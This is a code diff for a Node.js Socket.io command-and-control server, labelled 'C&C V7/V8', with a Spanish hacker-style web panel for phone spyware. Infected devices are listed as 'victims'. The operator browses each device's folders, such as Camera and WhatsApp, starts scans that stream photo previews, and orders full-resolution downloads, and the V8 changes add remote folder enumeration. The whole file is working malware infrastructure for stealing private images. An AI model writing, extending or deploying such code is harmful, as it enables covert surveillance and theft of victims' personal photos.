@@ -6,188 +6,76 @@ const cors = require('cors');
 const app = express();
 app.use(cors());
 
-// --- CONFIGURACIÓN ---
 const AUTH_PASS = "admin123"; 
 const PORT = process.env.PORT || 3000;
 
-// --- INTERFAZ WEB V7 ---
 app.get('/', (req, res) => {
-    if (req.query.auth !== AUTH_PASS) {
-        return res.send(`<body style="background:black;color:red;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;font-size:24px;">⛔ ACCESO DENEGADO</body>`);
-    }
+    if (req.query.auth !== AUTH_PASS) return res.send(`⛔ ACCESO DENEGADO`);
 
     res.send(`
     <html>
         <head>
-            <title>C&C V7 ULTIMATE</title>
+            <title>C&C V8 INTELLIGENCE</title>
             <meta name="viewport" content="width=device-width, initial-scale=1">
             <link href="https://fonts.googleapis.com/css2?family=VT323&display=swap" rel="stylesheet">
             <style>
-                :root { 
-                    --bg: #050505; 
-                    --panel: #111; 
-                    --primary: #00ff41; 
-                    --accent: #008F11; 
-                    --warn: #ffcc00; 
-                    --danger: #ff0033; 
-                    --text: #e0e0e0; 
-                }
-                
-                body { 
-                    font-family: 'VT323', monospace; 
-                    background: var(--bg); 
-                    color: var(--text); 
-                    margin: 0; padding: 0; 
-                    height: 100vh; 
-                    overflow: hidden; 
-                    font-size: 18px;
-                }
-                
+                :root { --bg: #050505; --panel: #111; --primary: #00ff41; --accent: #008F11; --text: #e0e0e0; --danger: #ff0033; --warn: #ffcc00; }
+                body { font-family: 'VT323', monospace; background: var(--bg); color: var(--text); margin: 0; height: 100vh; overflow: hidden; font-size: 18px; }
                 .container { display: grid; grid-template-columns: 350px 1fr; height: 100%; }
-                
-                .sidebar { 
-                    background: var(--panel); 
-                    border-right: 2px solid var(--primary); 
-                    padding: 20px; 
-                    display: flex; flex-direction: column; gap: 20px; 
-                    overflow-y: auto;
-                    box-shadow: 5px 0 15px rgba(0, 255, 65, 0.1);
-                }
-                
-                .logo { 
-                    color: var(--primary); 
-                    font-size: 28px; 
-                    border-bottom: 2px dashed var(--primary); 
-                    padding-bottom: 15px; 
-                    text-align: center;
-                    text-shadow: 0 0 5px var(--primary);
-                }
-
-                .control-group { 
-                    background: #000; 
-                    padding: 15px; 
-                    border: 1px solid #333; 
-                    position: relative;
-                }
-                .control-group::before { content: ''; position: absolute; top: -1px; left: -1px; width: 10px; height: 10px; border-top: 2px solid var(--primary); border-left: 2px solid var(--primary); }
-                .control-group::after { content: ''; position: absolute; bottom: -1px; right: -1px; width: 10px; height: 10px; border-bottom: 2px solid var(--primary); border-right: 2px solid var(--primary); }
-
+                .sidebar { background: var(--panel); border-right: 2px solid var(--primary); padding: 20px; display: flex; flex-direction: column; gap: 20px; overflow-y: auto; }
+                .logo { color: var(--primary); font-size: 28px; border-bottom: 2px dashed var(--primary); padding-bottom: 15px; text-align: center; }
+                .control-group { background: #000; padding: 15px; border: 1px solid #333; position: relative; }
                 .label { font-size: 20px; color: var(--primary); margin-bottom: 8px; display:block; }
-                
-                select, input { 
-                    width: 100%; padding: 10px; 
-                    background: #1a1a1a; 
-                    border: 1px solid var(--accent); 
-                    color: white; 
-                    font-family: 'VT323', monospace; 
-                    font-size: 18px; 
-                    outline: none;
-                    box-sizing: border-box;
-                    margin-bottom: 5px;
-                }
-                select:focus, input:focus { border-color: var(--primary); background: #222; }
-
-                button { 
-                    width: 100%; padding: 12px; 
-                    border: 1px solid var(--primary); 
-                    background: #000; 
-                    color: var(--primary); 
-                    font-family: 'VT323', monospace; 
-                    font-size: 20px; 
-                    cursor: pointer; 
-                    margin-top: 8px; 
-                    transition: 0.1s;
-                    text-transform: uppercase;
-                }
-                button:hover { background: var(--primary); color: black; font-weight: bold; box-shadow: 0 0 10px var(--primary); }
-                button:active { transform: translateY(2px); }
-                
+                select, input { width: 100%; padding: 10px; background: #1a1a1a; border: 1px solid var(--accent); color: white; font-family: 'VT323', monospace; font-size: 18px; outline: none; margin-bottom: 5px; }
+                button { width: 100%; padding: 12px; border: 1px solid var(--primary); background: #000; color: var(--primary); font-family: 'VT323', monospace; font-size: 20px; cursor: pointer; margin-top: 8px; text-transform: uppercase; }
+                button:hover { background: var(--primary); color: black; font-weight: bold; }
                 .btn-stop { border-color: var(--danger); color: var(--danger); }
-                .btn-stop:hover { background: var(--danger); color: black; box-shadow: 0 0 10px var(--danger); }
-
-                .btn-freeze { border-color: var(--warn); color: var(--warn); }
-                .btn-freeze.active { background: var(--warn); color: black; animation: blink 1s infinite; }
-                
-                @keyframes blink { 50% { opacity: 0.5; } }
-
+                .btn-stop:hover { background: var(--danger); color: black; }
                 .main-area { padding: 20px; overflow-y: auto; background: #080808; position: relative; }
-                
-                .header-stats { 
-                    position: sticky; top: 0; background: rgba(0,0,0,0.9); 
-                    padding: 10px; border-bottom: 1px solid var(--primary); 
-                    margin: -20px -20px 20px -20px; 
-                    z-index: 10; display:flex; justify-content:space-between; 
-                    font-size: 22px; color: var(--primary);
-                }
-                
-                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; padding-bottom: 50px; }
-                
-                .card { 
-                    background: #111; border: 1px solid #333; 
-                    position: relative; 
-                    transition: 0.2s;
-                }
-                .card:hover { border-color: var(--primary); transform: scale(1.02); z-index: 5; }
-                
+                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 15px; }
+                .card { background: #111; border: 1px solid #333; position: relative; }
                 .card img { width: 100%; height: 150px; object-fit: cover; cursor: pointer; display: block; filter: grayscale(20%); }
                 .card:hover img { filter: grayscale(0%); }
-                
-                .card-footer { 
-                    padding: 5px; font-size: 16px; 
-                    background: #000; border-top: 1px solid #333;
-                    display: flex; justify-content: space-between; align-items: center;
-                }
-
-                .badge { 
-                    position: absolute; top: 0; left: 0; 
-                    background: black; color: var(--primary); 
-                    padding: 2px 6px; font-size: 14px; border-bottom-right-radius: 4px;
-                    border-right: 1px solid var(--primary); border-bottom: 1px solid var(--primary);
-                }
-                
-                ::-webkit-scrollbar { width: 10px; }
-                ::-webkit-scrollbar-track { background: #111; }
-                ::-webkit-scrollbar-thumb { background: #333; border: 1px solid var(--primary); }
-                ::-webkit-scrollbar-thumb:hover { background: var(--primary); }
-
+                .badge { position: absolute; top: 0; left: 0; background: black; color: var(--primary); padding: 2px 6px; font-size: 14px; border-right: 1px solid var(--primary); border-bottom: 1px solid var(--primary); }
             </style>
         </head>
         <body>
             <div class="container">
                 <div class="sidebar">
-                    <div class="logo">> SYSTEM V7_ROOT</div>
+                    <div class="logo">> SYSTEM V8_ROOT</div>
 
                     <div class="control-group">
                         <span class="label">1. OBJETIVO [TARGET]</span>
-                        <select id="victimSelector">
+                        <select id="victimSelector" onchange="updateFolderList()">
                             <option value="ALL">[*] TODOS LOS DISPOSITIVOS</option>
                         </select>
-                        <div id="connectionStatus" style="font-size:16px; color:#555; margin-top:5px;">Buscando...</div>
+                        <div id="connectionStatus" style="color:#555; margin-top:5px;">Buscando...</div>
                     </div>
 
                     <div class="control-group">
-                        <span class="label">2. FILTRO INTELIGENTE</span>
-                        <input type="text" id="smartFolder" placeholder="Ej: Camera, WhatsApp, dcim">
-                        <div style="font-size:14px; color:#666; margin-top:2px;">* Dejar vacío para escanear TODO</div>
+                        <span class="label">2. CARPETA OBJETIVO</span>
+                        <select id="folderSelect" onchange="syncFolderInput()">
+                            <option value="">[★] ESCANEAR TODO</option>
+                        </select>
+                        <input type="text" id="smartFolder" placeholder="O escribir manual..." oninput="document.getElementById('folderSelect').value='manual'">
                     </div>
 
                     <div class="control-group">
                         <span class="label">3. EJECUTAR</span>
-                        <button onclick="sendCommand('start')">[▶] INICIAR ESCANEO</button>
-                        <button class="btn-stop" onclick="sendCommand('stop')">[X] DETENER PROCESO</button>
+                        <button onclick="sendCommand('start')">[▶] INICIAR</button>
+                        <button class="btn-stop" onclick="sendCommand('stop')">[X] DETENER</button>
                     </div>
 
                     <div class="control-group">
-                        <span class="label">4. VISUALIZACIÓN</span>
-                        <button id="btnFreeze" class="btn-freeze" onclick="toggleFreeze()">[II] CONGELAR PANTALLA</button>
-                        <button onclick="clearGrid()">[🗑] LIMPIAR BUFFER</button>
+                        <span class="label">4. BUFFER</span>
+                        <button onclick="document.getElementById('grid').innerHTML=''; document.getElementById('count').innerText='0';">[🗑] LIMPIAR</button>
                     </div>
                 </div>
 
                 <div class="main-area">
-                    <div class="header-stats">
-                        <span>ESTADO: <span id="lblStatus" style="color:white;">ESPERANDO COMANDO...</span></span>
-                        <span>IMÁGENES: <span id="count" style="color:white;">0</span></span>
+                    <div style="position:sticky; top:0; background:rgba(0,0,0,0.9); padding:10px; border-bottom:1px solid #00ff41; z-index:10; display:flex; justify-content:space-between; color:#00ff41;">
+                        <span id="lblStatus">ESPERANDO...</span>
+                        <span>IMGS: <span id="count">0</span></span>
                     </div>
                     <div class="grid" id="grid"></div>
                 </div>
@@ -196,128 +84,89 @@ app.get('/', (req, res) => {
             <script src="/socket.io/socket.io.js"></script>
             <script>
                 const socket = io();
-                
                 let victimsMap = {}; 
-                let isFrozen = false;
-                let pendingBuffer = []; 
                 let photoCount = 0;
 
-                // --- ACTUALIZAR LISTA DE DISPOSITIVOS ---
+                // 1. RECIBIMOS LISTA DE DISPOSITIVOS Y SUS CARPETAS
                 socket.on('update_device_list', (victims) => {
-                    console.log("Lista recibida:", victims);
                     victimsMap = victims;
                     const sel = document.getElementById('victimSelector');
-                    const current = sel.value; // Guardar selección actual
+                    const current = sel.value;
                     
-                    // Siempre poner 'ALL' primero
                     let html = '<option value="ALL">[*] TODOS (' + Object.keys(victims).length + ')</option>';
-                    
                     for (const [id, info] of Object.entries(victims)) {
-                        // Aquí se muestra el modelo del celular
                         html += \`<option value="\${id}">📱 \${info.name}</option>\`;
                     }
                     sel.innerHTML = html;
+                    if (current !== 'ALL' && victims[current]) sel.value = current;
+
+                    document.getElementById('connectionStatus').innerText = Object.keys(victims).length + " Conectados";
                     
-                    // Intentar mantener la selección si aún existe
-                    if (current !== 'ALL' && victims[current]) {
-                        sel.value = current;
-                    } else {
-                        sel.value = 'ALL';
-                    }
-
-                    const statusDiv = document.getElementById('connectionStatus');
-                    const count = Object.keys(victims).length;
-                    if(count > 0) {
-                        statusDiv.innerText = count + " Dispositivos Conectados";
-                        statusDiv.style.color = "#00ff41";
-                    } else {
-                        statusDiv.innerText = "Esperando conexiones...";
-                        statusDiv.style.color = "#555";
-                    }
+                    // Actualizar dropdown de carpetas según selección actual
+                    updateFolderList();
                 });
 
-                socket.on('new_preview', data => {
-                    if (isFrozen) {
-                        pendingBuffer.push(data);
-                        document.getElementById('btnFreeze').innerText = "[II] PENDIENTES: " + pendingBuffer.length;
-                        return;
-                    }
-                    processImage(data);
-                });
-
-                function processImage(data) {
+                // 2. FUNCIÓN PARA LLENAR EL DROPDOWN DE CARPETAS
+                function updateFolderList() {
                     const targetId = document.getElementById('victimSelector').value;
-                    if (targetId !== "ALL" && targetId !== data.victimId) return;
-                    renderCard(data);
+                    const folderSel = document.getElementById('folderSelect');
+                    const manualInput = document.getElementById('smartFolder');
+                    
+                    let html = '<option value="">[★] ESCANEAR TODO (COMPLETO)</option>';
+
+                    if (targetId !== 'ALL' && victimsMap[targetId] && victimsMap[targetId].folders) {
+                        // Si hay un dispositivo seleccionado y tiene carpetas
+                        victimsMap[targetId].folders.sort().forEach(folder => {
+                            html += \`<option value="\${folder}">📂 \${folder}</option>\`;
+                        });
+                        manualInput.placeholder = "O escribe manual para " + victimsMap[targetId].name;
+                    } else {
+                        html += '<option disabled>-- Selecciona un dispositivo para ver carpetas --</option>';
+                        manualInput.placeholder = "Escribe nombre de carpeta (ej: Camera)";
+                    }
+                    
+                    html += '<option value="manual">[✎] ESCRIBIR MANUALMENTE...</option>';
+                    folderSel.innerHTML = html;
                 }
 
-                function renderCard(data) {
+                // Sincronizar Select con Input
+                function syncFolderInput() {
+                    const val = document.getElementById('folderSelect').value;
+                    const input = document.getElementById('smartFolder');
+                    if (val === 'manual') {
+                        input.value = '';
+                        input.focus();
+                    } else {
+                        input.value = val;
+                    }
+                }
+
+                socket.on('new_preview', data => {
                     if(document.getElementById(data.path)) return;
+                    const targetId = document.getElementById('victimSelector').value;
+                    if (targetId !== "ALL" && targetId !== data.victimId) return;
 
                     const div = document.createElement('div');
                     div.className = 'card';
                     div.id = data.path;
-                    
-                    const ownerName = victimsMap[data.victimId]?.name || "Unk";
-                    
-                    div.innerHTML = \`
-                        <div class="badge">\${ownerName} | \${data.folder}</div>
-                        <img src="data:image/jpeg;base64,\${data.image64}" onclick="pedirHD('\${data.path}', '\${data.victimId}')" title="Clic para descargar HD">
-                        <div class="card-footer">
-                            <span style="font-size:12px; color:#777;">\${data.name.substring(0,10)}</span>
-                            <span style="cursor:pointer; color:var(--primary);" onclick="pedirHD('\${data.path}', '\${data.victimId}')">[HD]</span>
-                        </div>
-                    \`;
-
+                    div.innerHTML = \`<div class="badge">\${victimsMap[data.victimId]?.name || "Unk"} | \${data.folder}</div>
+                        <img src="data:image/jpeg;base64,\${data.image64}" onclick="socket.emit('order_download', {path:'\${data.path}', target:'\${data.victimId}'})">\`;
                     document.getElementById('grid').prepend(div);
-                    photoCount++;
-                    document.getElementById('count').innerText = photoCount;
-                }
-
-                function toggleFreeze() {
-                    isFrozen = !isFrozen;
-                    const btn = document.getElementById('btnFreeze');
-                    
-                    if (isFrozen) {
-                        btn.classList.add('active');
-                        btn.innerText = "[II] PANTALLA CONGELADA";
-                    } else {
-                        btn.classList.remove('active');
-                        btn.innerText = "[II] CONGELAR PANTALLA";
-                        pendingBuffer.forEach(data => processImage(data));
-                        pendingBuffer = [];
-                    }
-                }
+                    document.getElementById('count').innerText = ++photoCount;
+                });
 
                 function sendCommand(action) {
                     const target = document.getElementById('victimSelector').value;
                     const folder = document.getElementById('smartFolder').value.trim();
-                    const cmd = action === 'start' ? 'start_scan' : 'stop_scan';
-                    
-                    document.getElementById('lblStatus').innerText = action === 'start' ? ">> ESCANEANDO: " + (folder || "TODO") : ">> SISTEMA DETENIDO";
-                    document.getElementById('lblStatus').style.color = action === 'start' ? "#00ff41" : "red";
-
-                    socket.emit('admin_command', { action: cmd, target: target, folder: folder });
-                }
-
-                function pedirHD(path, targetId) {
-                    socket.emit('order_download', { path: path, target: targetId });
-                }
-
-                function clearGrid() {
-                    document.getElementById('grid').innerHTML = '';
-                    photoCount = 0;
-                    document.getElementById('count').innerText = '0';
-                    pendingBuffer = [];
+                    document.getElementById('lblStatus').innerText = action === 'start' ? ">> ESCANEANDO: " + (folder||"TODO") : "DETENIDO";
+                    socket.emit('admin_command', { action: action === 'start' ? 'start_scan' : 'stop_scan', target, folder });
                 }
 
                 socket.on('receive_full', data => {
                     const a = document.createElement('a');
                     a.href = "data:image/jpeg;base64," + data.image64;
                     a.download = "HD_" + data.name;
-                    document.body.appendChild(a);
-                    a.click();
-                    document.body.removeChild(a);
+                    document.body.appendChild(a); a.click(); document.body.removeChild(a);
                 });
             </script>
         </body>
@@ -326,29 +175,27 @@ app.get('/', (req, res) => {
 });
 
 const server = http.createServer(app);
-
-const io = new Server(server, { 
-    cors: { origin: "*" }, 
-    allowEIO3: true,
-    maxHttpBufferSize: 1e8 
-});
-
+const io = new Server(server, { cors: { origin: "*" }, allowEIO3: true, maxHttpBufferSize: 1e8 });
 let victims = {};
 
 io.on('connection', (socket) => {
-    
-    // --- ESTO ES LO NUEVO: Enviar lista apenas te conectas ---
     socket.emit('update_device_list', victims);
 
-    // 1. REGISTRO
     socket.on('usrData', (data) => {
         if (data.dataType === 'register_device') {
-            // Guardamos el modelo del dispositivo (ej: "Samsung SM-A52")
-            victims[socket.id] = { name: data.deviceName, id: data.deviceId };
-            console.log(`[+] DISPOSITIVO: ${data.deviceName} (${socket.id})`);
-            
-            // Avisamos a TODOS (incluida la web) que hay uno nuevo
+            // Inicializar dispositivo (si no existía)
+            if (!victims[socket.id]) victims[socket.id] = {};
+            victims[socket.id].name = data.deviceName;
+            victims[socket.id].id = data.deviceId;
             io.emit('update_device_list', victims);
+        }
+        // --- NUEVO: GUARDAR CARPETAS ---
+        else if (data.dataType === 'folder_list') {
+            if (victims[socket.id]) {
+                victims[socket.id].folders = data.folders; // Guardamos el array de carpetas
+                console.log(`[+] Carpetas recibidas de ${victims[socket.id].name}: ${data.folders.length}`);
+                io.emit('update_device_list', victims); // Actualizamos la web para que aparezcan
+            }
         }
         else if (data.dataType === 'preview_image') {
             data.victimId = socket.id;
@@ -360,26 +207,20 @@ io.on('connection', (socket) => {
     });
 
     socket.on('admin_command', (cmd) => {
-        if (cmd.target === 'ALL') {
-            socket.broadcast.emit('command_' + cmd.action, { folder: cmd.folder });
-        } else {
-            io.to(cmd.target).emit('command_' + cmd.action, { folder: cmd.folder });
-        }
+        if (cmd.target === 'ALL') socket.broadcast.emit('command_' + cmd.action, { folder: cmd.folder });
+        else io.to(cmd.target).emit('command_' + cmd.action, { folder: cmd.folder });
     });
 
     socket.on('order_download', (data) => {
-        if(data.target) {
-            io.to(data.target).emit('request_full_image', { path: data.path });
-        }
+        if(data.target) io.to(data.target).emit('request_full_image', { path: data.path });
     });
 
     socket.on('disconnect', () => {
         if (victims[socket.id]) {
-            console.log(`[-] SALIÓ: ${victims[socket.id].name}`);
             delete victims[socket.id];
             io.emit('update_device_list', victims);
         }
     });
 });
 
-server.listen(PORT, () => console.log(`🚀 SYSTEM V7.1 ONLINE :: PORT ${PORT}`));
+server.listen(PORT, () => console.log(`🚀 SYSTEM V8 ONLINE`));
